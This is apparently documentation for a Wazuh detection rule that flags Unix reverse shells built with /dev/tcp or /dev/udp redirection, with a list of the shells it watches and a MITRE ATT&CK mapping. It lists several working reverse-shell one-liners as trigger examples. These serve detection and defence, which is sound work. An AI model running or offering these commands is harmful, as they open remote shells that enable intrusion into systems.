# 🛡️ Wazuh Rule – Unix Reverse Shell via `/dev/tcp` or `/dev/udp`
> 🚨 **WARNING**
>
> This rule depends on **Bash command-line audit logging**.
>
> You **must** configure command auditing as documented in  
> 👉 **[`Prerequisites/command_line_audit.md`](Prerequisites/command_line_audit.md)**
>
> Failure to meet these prerequisites will result in **no detections**.

## Rule ID
**100101**

## Severity
**Level 15 (High / Critical)**

---

## 📖 Overview

This Wazuh rule detects **potential Unix reverse shell activity** leveraging **shell interpreters** combined with **network redirection via `/dev/tcp` or `/dev/udp`**.

The detection focuses on a well-known post-exploitation technique where attackers use built-in shell features to establish outbound interactive connections, often bypassing traditional security controls and external tools.

---

## 🔍 What This Rule Detects

The rule triggers when **both conditions** are met:

1. **A Unix shell interpreter is executed**, such as:
   - `bash`
   - `sh`
   - `dash`
   - `zsh`
   - `ksh`, `mksh`
   - `ash` (BusyBox / Alpine / IoT)
   - `csh`, `tcsh`
   - `fish`

2. **Network redirection using `/dev/tcp` or `/dev/udp`** is present, indicating a raw socket connection to an IP address.

This combination is a **strong indicator of an interactive reverse shell**.

---

## 🧪 Example Commands That Trigger the Rule

```bash
sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'
dash -i >/dev/tcp/8.8.8.8/1337 2>&1
ash -i < /dev/udp/10.0.0.5/53
sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5
```

---

## ❌ Examples That Do NOT Trigger the Rule

```bash
bash script.sh
sh -c "echo test"
```

---

## 🎯 MITRE ATT&CK Mapping

- **T1059.004** – Command and Scripting Interpreter: Unix Shell  
- **T1219** – Remote Access Software  
- **T1105** – Ingress Tool Transfer
